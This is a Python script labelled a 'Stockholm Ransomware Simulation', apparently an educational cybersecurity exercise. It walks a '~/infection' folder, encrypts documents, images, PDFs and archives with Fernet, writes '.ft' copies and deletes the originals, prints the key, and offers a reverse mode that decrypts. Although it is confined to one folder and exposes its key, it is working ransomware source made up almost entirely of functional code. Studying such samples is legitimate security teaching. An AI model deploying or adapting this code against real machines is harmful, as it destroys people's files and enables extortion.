"""
Stockholm Ransomware Simulation

This script simulates a ransomware attack by encrypting files in a specified directory
and providing functionality to decrypt them with a given key.

Modules:
    os: Provides a way of using operating system dependent functionality.
    sys: Provides access to some variables used or maintained by the interpreter.
    argparse: Provides a command-line argument parsing functionality.
    cryptography.fernet: Implements symmetric encryption using the Fernet algorithm.

Functions:
    generate_key(): Generates a new Fernet encryption key.
    load_key(key): Loads a Fernet encryption key.
    encrypt_file(file_path, fernet): Encrypts a file using the provided Fernet key.
    decrypt_file(file_path, fernet): Decrypts a file using the provided Fernet key.
    parse_args(): Parses command-line arguments.
    main(): Main function to handle encryption and decryption based on command-line arguments.

Usage:
    To encrypt files:
        python stockholm.py

    To decrypt files:
        python stockholm.py --reverse <encryption_key>

    Additional options:
        -v, --version: Show version information.
        -s, --silent: Run without output.
"""
import sys
import argparse
from cryptography.fernet import Fernet
import os

TARGET_EXTENSIONS = [
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.jpg', '.jpeg', '.png', '.txt', '.pdf', '.zip'
]


def generate_key():
    return Fernet.generate_key()


def load_key(key):
    return Fernet(key)


def encrypt_file(file_path, fernet):
    with open(file_path, 'rb') as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(file_path + '.ft', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
    os.remove(file_path)


def decrypt_file(file_path, fernet):
    with open(file_path, 'rb') as file:
        encrypted = file.read()
    decrypted = fernet.decrypt(encrypted)
    original_path = file_path.replace('.ft', '')
    with open(original_path, 'wb') as decrypted_file:
        decrypted_file.write(decrypted)
    os.remove(file_path)


def parse_args():
    parser = argparse.ArgumentParser(
        description='Stockholm Ransomware Simulation')
    parser.add_argument('-v', '--version',
                        action='store_true', help='Show version')
    parser.add_argument('-r', '--reverse', type=str,
                        help="Reverse the encryption with the provided key")
    parser.add_argument('-s', '--silent', action='store_true',
                        help="Run without output")
    args = parser.parse_args()
    return args


def main():
    args = parse_args()

    if args.version:
        print("Stockholm Ransomware Simulation Version 1.0")
        sys.exit(0)

    infection_folder = os.path.expanduser('~/infection')
    if not os.path.exists(infection_folder):
        print("Infection folder does not exist.")
        sys.exit(1)

    if args.reverse:
        fernet = load_key(args.reverse.encode())
        for root, dirs, files in os.walk(infection_folder):
            for file in files:
                file_path = os.path.join(root, file)
                if file.endswith('.ft'):
                    decrypt_file(file_path, fernet)
                    if not args.silent:
                        print(f"Decrypted {file_path}")
    else:
        key = generate_key()
        fernet = load_key(key)
        print(f"Encryption key: {key.decode()}")
        for root, dirs, files in os.walk(infection_folder):
            for file in files:
                file_path = os.path.join(root, file)
                if any(file.endswith(ext) for ext in TARGET_EXTENSIONS) and not file.endswith('.ft'):
                    encrypt_file(file_path, fernet)
                    if not args.silent:
                        print(f"Encrypted {file_path}")


if __name__ == "__main__":
    main()
